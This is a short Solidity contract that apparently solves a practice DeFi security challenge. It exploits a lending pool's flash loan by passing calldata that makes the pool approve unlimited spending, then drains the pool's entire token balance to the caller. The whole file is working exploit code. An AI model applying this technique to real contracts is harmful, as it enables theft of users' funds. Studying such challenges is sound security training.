// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    TrusterLenderPool target;
    IERC20 token;

    constructor(TrusterLenderPool _target, IERC20 _token) {
        target = _target;
        token = _token;
    }

    function attack() external {
        target.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        token.transferFrom(address(target), msg.sender, token.balanceOf(address(target)));
    }
}
